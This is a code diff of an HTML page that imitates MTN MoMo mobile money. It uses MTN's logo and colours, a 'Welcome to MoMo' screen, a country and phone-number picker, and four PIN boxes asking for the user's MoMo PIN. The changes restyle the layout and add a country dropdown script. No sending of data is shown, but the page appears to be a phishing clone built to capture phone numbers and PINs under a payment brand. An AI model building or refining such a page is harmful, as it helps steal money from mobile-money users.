@@ -33,7 +33,7 @@
       display: flex;
       flex-direction: column;
       overflow: hidden;
-      /* Prevent full page scroll */
+      overflow-y: auto;
     }
 
     .lang-toggle {
@@ -431,94 +431,106 @@
       <input type="tel" maxlength="1" class="pin-box" id="pin-3" inputmode="numeric" />
       <input type="tel" maxlength="1" class="pin-box" id="pin-4" inputmode="numeric" />
     </div>
-    <p class="mt-8 text-sm text-slate-400 italic">
+    <p class="-mt-16 text-sm text-slate-400 italic">
       Please enter your MTN MoMo Pin to proceed.
     </p>
   </div>
- <div id="main-content" class="w-full flex flex-col opacity-0 transition-opacity duration-1000 relative overflow-x-hidden px-5"
-    style="min-height: 100vh; background-color: #ffffff;">
+ <div id="main-content" class="w-full flex flex-col opacity-0 transition-opacity duration-1000 relative overflow-x-hidden min-h-screen bg-white">
+  
+  <div class="absolute top-0 left-0 right-0 h-[42vh] bg-[#004f71] flex flex-col items-center pt-12 z-0">
+    <img src="mtn-logo.png" alt="MoMo from MTN" class="w-24 h-auto object-contain" />
+  </div>
+
+  <div class="relative w-full flex-1 flex flex-col items-center px-6 z-10 pt-[24vh]">
     
-    <div class="absolute inset-0 flex flex-col pointer-events-none z-0">
-      <div class="h-[38%] w-full rounded-b-[15px]" style="background-color: #01466a;"></div>
-      <div class="h-[62%] w-full bg-white"></div>
-    </div>
+    <div class="w-full max-w-md bg-white rounded-[32px] shadow-xl p-8 flex flex-col items-center text-center">
+      <h2 class="text-[#004f71] text-2xl font-bold mb-8">Welcome to MoMo</h2>
+      
+      <div class="w-full flex gap-3 h-[72px] relative">
 
-    <div class="w-full flex flex-col items-center pt-10 text-center z-10 relative">
-      <div class="w-28 h-28 bg-[#01466a] rounded-2xl flex items-center justify-center p-1">
-        <img src="mtn-logo.png" alt="MoMo Logo" class="w-full h-full object-contain rounded-xl" onerror="
-              this.src = 'https://placehold.co/400x400/FFD600/000?text=MoMo'
-            " />
+        
+  
+  <div id="countryDropdownBtn" class="relative flex items-center justify-center w-[76px] border border-gray-400 rounded-[20px] bg-white cursor-pointer hover:border-[#004f71] transition-colors z-20">
+    <div class="w-10 h-10 rounded-full overflow-hidden flex items-center justify-center border border-gray-100 shadow-inner">
+      <img id="selectedFlag" src="https://flagcdn.com/w80/ug.png" alt="Uganda" class="w-full h-full object-cover scale-110" />
+    </div>
+  </div>
+
+  <div class="flex-1 relative border border-gray-400 rounded-[20px] bg-white px-5 flex items-center focus-within:border-[#004f71] transition-colors">
+    <label class="absolute left-4 -top-2.5 bg-white px-1 text-xs text-[#004f71] font-medium">Enter number *</label>
+    <input 
+      type="tel" 
+      id="phoneNumber"
+      placeholder="256" 
+      class="w-full h-full bg-transparent text-[19px] text-gray-800 outline-none font-medium tracking-wide"
+    />
+  </div>
+
+  <div id="countryMenu" class="hidden absolute left-0 right-0 top-[80px] bg-white border border-[#004f71] rounded-[24px] shadow-2xl p-5 z-30">
+    <h3 class="text-black text-lg font-semibold mb-4 text-left px-2">Select your country</h3>
+    
+    <div class="flex flex-col max-h-[240px] overflow-y-auto pr-1">
+      
+      <div class="country-option flex items-center gap-4 p-3 hover:bg-gray-50 rounded-xl cursor-pointer transition-colors" data-code="256" data-flag="https://flagcdn.com/w80/ug.png">
+        <div class="w-8 h-8 rounded-full overflow-hidden flex-shrink-0 border border-gray-100"><img src="https://flagcdn.com/w80/ug.png" class="w-full h-full object-cover scale-110" /></div>
+        <span class="text-gray-900 font-medium text-[16px]">Uganda</span>
       </div>
-    </div>
 
-    <div class="relative mt-12 mx-auto w-full max-w-[420px] bg-white rounded-[32px] px-6 py-8 shadow-2xl flex flex-col items-center z-20">
-      <div class="w-full flex flex-col items-center">
-        <h2 class="text-[#01466a] text-[22px] font-bold text-center mb-8 tracking-tight">
-          Welcome to MoMo
-        </h2>
-
-        <form id="phoneForm" onsubmit="event.preventDefault()" class="w-full flex flex-col">
-          <div class="flex items-center gap-3 w-full">
-            <div
-              class="relative w-24 h-20 border border-black rounded-[20px] flex items-center justify-center bg-white px-2">
-              <select id="countrySelector"
-                class="w-full h-full opacity-0 absolute top-0 left-0 z-10 cursor-pointer appearance-none" onchange="
-                    document.getElementById('displayFlag').src =
-                      this.options[this.selectedIndex].getAttribute(
-                        'data-flag-url',
-                      )
-                  ">
-                <option value="+237" data-flag-url="https://flagcdn.com/w40/cm.png">
-                  Cameroon
-                </option>
-                <option value="+225" data-flag-url="https://flagcdn.com/w40/ci.png">
-                  Cote d'Ivoire
-                </option>
-                <option value="+233" data-flag-url="https://flagcdn.com/w40/gh.png">
-                  Ghana
-                </option>
-                <option value="+256" data-flag-url="https://flagcdn.com/w40/ug.png" selected>
-                  Uganda
-                </option>
-                <option value="+260" data-flag-url="https://flagcdn.com/w40/zm.png">
-                  Zambia
-                </option>
-                <option value="+229" data-flag-url="https://flagcdn.com/w40/bj.png">
-                  Benin
-                </option>
-              </select>
-              <div class="flex items-center justify-center pointer-events-none">
-                <img id="displayFlag" src="https://flagcdn.com/w40/ug.png" alt="Flag"
-                  class="w-10 h-10 rounded-full object-cover shadow-sm border border-gray-100" />
-              </div>
-            </div>
-
-            <div class="relative flex-1 h-20 border border-black rounded-[20px] flex items-center px-5 bg-white">
-              <input type="tel" id="phoneNumber"
-                class="w-full h-full text-lg font-medium text-black placeholder-black bg-transparent focus:outline-none"
-                placeholder="Enter number *" autocomplete="tel" />
-            </div>
-          </div>
-        </form>
+      <div class="country-option flex items-center gap-4 p-3 hover:bg-gray-50 rounded-xl cursor-pointer transition-colors" data-code="237" data-flag="https://flagcdn.com/w80/cm.png">
+        <div class="w-8 h-8 rounded-full overflow-hidden flex-shrink-0 border border-gray-100"><img src="https://flagcdn.com/w80/cm.png" class="w-full h-full object-cover scale-110" /></div>
+        <span class="text-gray-900 font-medium text-[16px]">Cameroon</span>
       </div>
-    </div>
 
-    <div class="w-full max-w-[420px] mx-auto mt-10 text-center z-10 relative px-4">
-      <p class="text-gray-500 text-[13px] font-normal leading-relaxed">
-        By using this app you agree to our 
-        <a href="#" class="text-[#01466a] font-medium">Mobile Terms of Use</a> 
-        and 
-        <a href="#" class="text-[#01466a] font-medium">Privacy Policy</a>
-      </p>
-    </div>
+      <div class="country-option flex items-center gap-4 p-3 hover:bg-gray-50 rounded-xl cursor-pointer transition-colors" data-code="225" data-flag="https://flagcdn.com/w80/ci.png">
+        <div class="w-8 h-8 rounded-full overflow-hidden flex-shrink-0 border border-gray-100"><img src="https://flagcdn.com/w80/ci.png" class="w-full h-full object-cover scale-110" /></div>
+        <span class="text-gray-900 font-medium text-[16px]">Côte d'Ivoire</span>
+      </div>
 
-    <div class="mt-auto w-full max-w-[420px] pb-8 pt-4 flex justify-center items-center z-10 mx-auto">
-      <button type="button" id="submitBtn"
-        class="w-full h-16 bg-[#01466a] text-white font-bold text-base rounded-full tracking-widest hover:bg-[#003552] transition-colors duration-300 shadow-md uppercase disabled:opacity-40 disabled:cursor-not-allowed"
-        disabled>
-        Next
-      </button>
+      <div class="country-option flex items-center gap-4 p-3 hover:bg-gray-50 rounded-xl cursor-pointer transition-colors" data-code="233" data-flag="https://flagcdn.com/w80/gh.png">
+        <div class="w-8 h-8 rounded-full overflow-hidden flex-shrink-0 border border-gray-100"><img src="https://flagcdn.com/w80/gh.png" class="w-full h-full object-cover scale-110" /></div>
+        <span class="text-gray-900 font-medium text-[16px]">Ghana</span>
+      </div>
+
+      <div class="country-option flex items-center gap-4 p-3 hover:bg-gray-50 rounded-xl cursor-pointer transition-colors" data-code="260" data-flag="https://flagcdn.com/w80/zm.png">
+        <div class="w-8 h-8 rounded-full overflow-hidden flex-shrink-0 border border-gray-100"><img src="https://flagcdn.com/w80/zm.png" class="w-full h-full object-cover scale-110" /></div>
+        <span class="text-gray-900 font-medium text-[16px]">Zambia</span>
+      </div>
+
+      <div class="country-option flex items-center gap-4 p-3 hover:bg-gray-50 rounded-xl cursor-pointer transition-colors" data-code="229" data-flag="https://flagcdn.com/w80/bj.png">
+        <div class="w-8 h-8 rounded-full overflow-hidden flex-shrink-0 border border-gray-100"><img src="https://flagcdn.com/w80/bj.png" class="w-full h-full object-cover scale-110" /></div>
+        <span class="text-gray-900 font-medium text-[16px]">Benin</span>
+      </div>
+
     </div>
+  </div>
+</div>
+        <!-- <div class="flex-1 relative border border-gray-400 rounded-2xl bg-white px-4 flex items-center focus-within:border-[#004f71] transition-colors">
+          <input 
+            type="tel" 
+            id="phoneNumber"
+            placeholder="Enter number *" 
+            class="w-full h-full bg-transparent text-lg text-black outline-none placeholder-gray-500 font-medium"
+          />
+        </div> -->
+      </div>
+
+    </div>
+    <p class="text-center text-sm text-[#004f71] max-w-xs font-medium leading-relaxed relative" style="top: -240px;">
+  By using this app you agree to our 
+  <a href="#" class="font-bold underline">Mobile Terms of Use</a> and 
+  <a href="#" class="font-bold underline">Privacy Policy</a>
+</p>
+  </div>
+
+  <div class="w-full px-6 pb-8 pt-2 z-10 flex justify-center bg-white">
+    <button 
+      id="submitBtn"
+      class="w-full max-w-sm bg-[#004e73] text-white py-4 rounded-full font-semibold text-base tracking-wide uppercase shadow-md active:bg-[#003b5c] transition-colors"
+    >
+      Next
+    </button>
+  </div>
+
 </div>
 
   <script>
@@ -903,6 +915,65 @@
         });
       });
     });
+
+    // ==================== PASTE THIS AT THE TOP OF YOUR SCRIPT CONTAINER ====================
+const dropdownBtn = document.getElementById("countryDropdownBtn");
+const countryMenu = document.getElementById("countryMenu");
+const selectedFlag = document.getElementById("selectedFlag");
+const phoneInput = document.getElementById("phoneNumber");
+const countryOptions = document.querySelectorAll(".country-option");
+
+// Keep track of the current selected country calling prefix (Uganda default)
+let currentPrefix = "256";
+
+// Force a headstart number directly into the field input on page render
+phoneInput.value = currentPrefix;
+
+// Open/Close Dropdown layout toggle menu
+dropdownBtn.addEventListener("click", (e) => {
+  e.stopPropagation();
+  countryMenu.classList.toggle("hidden");
+});
+
+// Interactive state switcher when a user taps a selection row
+countryOptions.forEach(option => {
+  option.addEventListener("click", () => {
+    const targetCode = option.getAttribute("data-code");
+    const targetFlagUrl = option.getAttribute("data-flag");
+
+    // Switch variables & update imagery matching choice
+    currentPrefix = targetCode;
+    selectedFlag.src = targetFlagUrl;
+    
+    // Inject selected country headstart code inside input field box
+    phoneInput.value = targetCode;
+
+    // Slide menu closed out of sight and throw focus to text cursor
+    countryMenu.classList.add("hidden");
+    phoneInput.focus();
+    
+    // Fire input update logic manually to update button disabled status
+    phoneInput.dispatchEvent(new Event('input'));
+  });
+});
+
+// Safely trap outside viewport boundary taps to collapse opened panels
+document.addEventListener("click", (e) => {
+  if (!dropdownBtn.contains(e.target) && !countryMenu.contains(e.target)) {
+    countryMenu.classList.add("hidden");
+  }
+});
+
+// Structural Enforcement: Lock prefix sequence from accidental keyboard delete actions
+phoneInput.addEventListener("input", (e) => {
+  let val = e.target.value.replace(/\D/g, ""); // Allow digits only
+  
+  if (!val.startsWith(currentPrefix)) {
+    val = currentPrefix;
+  }
+  e.target.value = val;
+});
+// =======================================================================================
   </script>
 </body>
 
